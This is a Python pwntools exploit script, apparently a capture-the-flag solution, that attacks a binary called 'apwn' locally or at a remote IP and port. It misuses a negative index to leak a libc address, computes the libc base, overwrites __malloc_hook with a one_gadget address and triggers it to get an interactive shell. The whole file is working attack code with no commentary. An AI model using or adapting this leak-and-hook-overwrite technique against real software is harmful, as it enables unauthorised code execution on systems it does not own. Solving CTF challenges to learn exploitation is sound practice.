from pwn import*
elf=ELF("./apwn")
context.log_level="debug"

local=0
if local:
	p=process("./apwn")
	libc=ELF("./libc-2.23.so")
	gadget=0xf1147
	pause()
	#gdb.attach(p)
else:
	p=remote("211.159.175.39",8686)
	libc=ELF("./libc-2.27.so")
	gadget=0x10a38c

def edits(ind,con):
	p.sendlineafter(">\n","3")
	p.sendlineafter("?\n",str(ind))
	p.sendafter("luck.\n",con)

def editl(ind,con):
	p.sendlineafter(">\n","4")
	p.sendlineafter("?\n",str(ind))
	p.sendafter("name?\n","chunk")
	p.sendafter("name\n",con)

def creats(con):
	p.sendlineafter(">\n","1")
#	p.sendafter("Name:\n",con)

def creatl(con):
	p.sendlineafter(">\n","2")
	p.sendafter("Name\n","aaaa")
	p.sendafter("name\n",con)

edits(-4,"aaaaaaaa")
p.recv(18)
addr=u64(p.recv(6).ljust(8,"\x00"))-0x83
print "_IO_2_1_stderr_addr:",hex(addr)

'''edits(-6,"aaaaaaaa")
p.recv(18)
addr=u64(p.recv(6).ljust(8,"\x00"))-0x83
print hex(addr)
'''
base=addr-libc.symbols['_IO_2_1_stderr_']


one_gadget=gadget+base
malloc=libc.symbols["__malloc_hook"]+base

creatl("bbbb")
edits(80,p64(malloc))
editl(0,p64(one_gadget))

creats("")

p.interactive()

